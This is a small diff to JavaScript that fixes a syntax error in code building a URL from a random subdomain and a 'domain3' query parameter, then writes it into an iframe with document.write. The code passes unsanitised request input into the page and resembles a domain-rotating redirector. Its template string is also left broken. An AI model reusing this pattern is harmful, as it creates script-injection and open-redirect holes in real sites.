@@ -37,7 +37,7 @@
         var domain3 = GET['domain3'], iframe = Number(GET['iframe']);
         var uniqid = Date.now().toString(36);
         var random = window.btoa(Date.now());
-        var url = 'https://' + uniqid +. domain3 + '/?==${random}';
+        var url = 'https://' + uniqid + domain3 + '/?==${random}';
         if (iframe) {
           document.write('<iframe src="' + url + '"></iframe>');
         } else {
